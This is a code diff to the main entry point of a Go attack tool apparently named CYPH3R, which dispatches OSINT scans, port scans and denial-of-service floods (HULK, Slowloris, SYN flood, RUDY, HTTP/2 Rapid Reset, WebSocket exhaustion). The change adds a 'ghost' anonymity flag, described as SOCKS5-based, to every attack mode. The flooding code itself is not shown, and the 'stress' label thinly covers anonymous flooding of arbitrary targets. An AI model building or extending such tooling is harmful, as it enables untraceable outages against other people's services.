@@ -136,10 +136,10 @@ func main() {
 	}
 	targetAddr := fmt.Sprintf("%s:%d", targetHost, targetPort)
 
-	// 2. Deep OSINT & Comprehensive Intelligence Report Mode
+	// 2. Deep OSINT & Comprehensive Intelligence Report Mode (Ghost-Compatible)
 	if *osintFlag {
 		fmt.Printf("[+] LAUNCHING FULL-STACK COMPREHENSIVE INTEL SCAN: %s\n", targetHost)
-		report := intel.ExecuteComprehensiveReport(targetHost)
+		report := intel.ExecuteComprehensiveReport(targetHost, *ghostFlag)
 		fmt.Println("\n╔═══════════════════════════════════════════════════════════════╗")
 		fmt.Println("║        CYPH3R COMPREHENSIVE INTELLIGENCE FIELD REPORT         ║")
 		fmt.Println("╚═══════════════════════════════════════════════════════════════╝")
@@ -190,10 +190,10 @@ func main() {
 		return
 	}
 
-	// 3. Accelerated Tactical Port Scan Mode (Ghost-Compatible via TCP Connect Scans)
+	// 3. Accelerated Tactical Port Scan Mode (Ghost-Compatible via SOCKS5 Sweeps)
 	if *scanFlag {
 		fmt.Printf("[+] LAUNCHING ACCELERATED PORT SCANNER & SERVICE PROBES: %s\n", targetHost)
-		openPorts := probes.ExecutePortScan(targetHost)
+		openPorts := intel.ExecutePortScan(targetHost, *ghostFlag)
 		
 		if len(openPorts) > 0 {
 			fmt.Printf("\n[+] Verified Open Listeners:\n")
@@ -226,33 +226,33 @@ func main() {
 		}
 	}
 
-	// 4. Stress & Benchmarking Engines with Continuous Loop Support
+	// 4. Stress & Benchmarking Engines with Ghost Mode Support
 	if *hulkFlag {
-		runWithLoop("HULK", func(d int) { stress.ExecuteContinuousStress(finalURL, *concurrencyFlag, d) })
+		runWithLoop("HULK", func(d int) { stress.ExecuteContinuousStress(finalURL, *concurrencyFlag, d, *ghostFlag) })
 		return
 	}
 	if *slowlorisFlag {
-		runWithLoop("Slowloris", func(d int) { stress.ExecuteSlowRateStress(finalURL, *concurrencyFlag, d) })
+		runWithLoop("Slowloris", func(d int) { stress.ExecuteSlowRateStress(finalURL, *concurrencyFlag, d, *ghostFlag) })
 		return
 	}
 	if *synFloodFlag {
-		runWithLoop("SYN Flood", func(d int) { stress.ExecuteTransportSynFlood(targetAddr, *concurrencyFlag, d) })
+		runWithLoop("SYN Flood", func(d int) { stress.ExecuteTransportSynFlood(targetAddr, *concurrencyFlag, d, *ghostFlag) })
 		return
 	}
 	if *wrkFlag {
-		runWithLoop("Wrk Benchmark", func(d int) { stress.ExecuteWrkBenchmark(finalURL, *concurrencyFlag, d) })
+		runWithLoop("Wrk Benchmark", func(d int) { stress.ExecuteWrkBenchmark(finalURL, *concurrencyFlag, d, *ghostFlag) })
 		return
 	}
 	if *rudyFlag {
-		runWithLoop("RUDY", func(d int) { stress.ExecuteRudyStress(finalURL, *concurrencyFlag, d) })
+		runWithLoop("RUDY", func(d int) { stress.ExecuteRudyStress(finalURL, *concurrencyFlag, d, *ghostFlag) })
 		return
 	}
 	if *h2Flag {
-		runWithLoop("HTTP/2 Rapid Reset", func(d int) { stress.ExecuteH2RapidResetStress(finalURL, *concurrencyFlag, d) })
+		runWithLoop("HTTP/2 Rapid Reset", func(d int) { stress.ExecuteH2RapidResetStress(finalURL, *concurrencyFlag, d, *ghostFlag) })
 		return
 	}
 	if *wsFlag {
-		runWithLoop("WebSocket Exhaustion", func(d int) { stress.ExecuteWebSocketStress(finalURL, *concurrencyFlag, d) })
+		runWithLoop("WebSocket Exhaustion", func(d int) { stress.ExecuteWebSocketStress(finalURL, *concurrencyFlag, d, *ghostFlag) })
 		return
 	}
 
